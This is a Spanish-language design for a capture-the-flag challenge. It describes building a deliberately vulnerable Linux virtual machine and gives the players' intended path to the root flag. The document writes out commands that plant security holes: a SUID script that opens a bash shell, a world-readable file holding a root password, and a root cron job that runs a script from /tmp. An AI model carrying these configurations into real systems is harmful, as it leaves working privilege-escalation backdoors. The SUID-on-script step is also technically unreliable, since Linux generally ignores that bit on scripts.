### **Reto 5: Flag Oculta en un Sistema de Máquina Virtual Vulnerable**  
**Tema principal**: Análisis de sistemas + Escalada de privilegios + Ingeniería inversa.

---

#### **Implementación Paso a Paso**

1. **Crear una máquina virtual básica:**
   - Usar una herramienta como VirtualBox o VMware para crear una VM con Ubuntu Server o Debian.
   - Configurar un usuario limitado:
     ```bash
     adduser jugador
     ```

2. **Configurar vulnerabilidades en la máquina virtual:**

   - **Vulnerabilidad 1: Binario SUID inseguro**
     Crear un script con permisos SUID que permita ejecutar comandos arbitrarios:
     ```bash
     echo '#!/bin/bash' > /usr/local/bin/vulnerable_suid
     echo '/bin/bash' >> /usr/local/bin/vulnerable_suid
     chmod +x /usr/local/bin/vulnerable_suid
     chmod u+s /usr/local/bin/vulnerable_suid
     ```
     Este binario permitirá al jugador abrir un shell como root si lo ejecuta.

   - **Vulnerabilidad 2: Archivo con permisos mal configurados**
     Crear un archivo de configuración accesible para todos los usuarios que contenga información sensible:
     ```bash
     echo "root_password=supersecreto" > /etc/vulnerable_config
     chmod 644 /etc/vulnerable_config
     ```

   - **Vulnerabilidad 3: Servicio vulnerable**
     Configurar un servicio SSH que permita autenticación sin contraseña (por ejemplo, mediante claves públicas preconfiguradas). Esto puede ser usado como vector inicial para acceder al sistema.

3. **Crear el archivo protegido con la flag:**
   - Guardar la flag en un archivo accesible solo por root:
     ```bash
     echo "Flag{Escalada_Privilegios_Exito}" > /root/flag.txt
     chmod 600 /root/flag.txt
     ```

4. **Exportar la máquina virtual:**
   - Exportar la VM como un archivo OVA o VMDK y entregarlo al jugador.

---

#### **Cómo lo resolverían los jugadores**

1. **Paso 1: Acceso inicial al sistema**
   - Usar las credenciales proporcionadas (`jugador` y su contraseña) o explotar el servicio SSH vulnerable para acceder a la máquina.

2. **Paso 2: Enumeración del sistema**
   - Analizar los binarios SUID disponibles:
     ```bash
     find / -perm -4000 2>/dev/null
     ```
   - Identificar `/usr/local/bin/vulnerable_suid` como un binario inseguro.

3. **Paso 3: Explotación del binario SUID**
   - Ejecutar el binario SUID para obtener acceso root:
     ```bash
     /usr/local/bin/vulnerable_suid
     ```

4. **Paso 4: Leer la flag**
   - Una vez obtenido acceso root, leer el archivo protegido:
     ```bash
     cat /root/flag.txt
     ```
   - Flag obtenida: `Flag{Escalada_Privilegios_Exito}`.

---

#### **Variantes para aumentar la dificultad**

- **Encadenar múltiples vulnerabilidades:**  
  Requerir que el jugador explote primero el archivo mal configurado (`/etc/vulnerable_config`) para obtener información sensible (como una contraseña), luego usar esa información para escalar privilegios.

- **Configurar técnicas anti-forensics:**  
  Incluir logs falsos o archivos señuelo que confundan al jugador durante la enumeración del sistema.

- **Añadir cifrado a la flag:**  
  Guardar la flag cifrada en `/root/flag.txt` y requerir que el jugador descifre el contenido utilizando una clave oculta en otro lugar del sistema:
  ```bash
  echo "Flag{Escalada_Privilegios_Exito}" | openssl enc -aes-256-cbc -salt -out /root/flag.enc -k superclave123
  ```

- **Incluir un cron job inseguro:**  
  Configurar un cron job ejecutado por root que permita al jugador inyectar comandos maliciosos:
  ```bash
  echo "*/5 * * * * root bash /tmp/malicioso.sh" >> /etc/crontab
  ```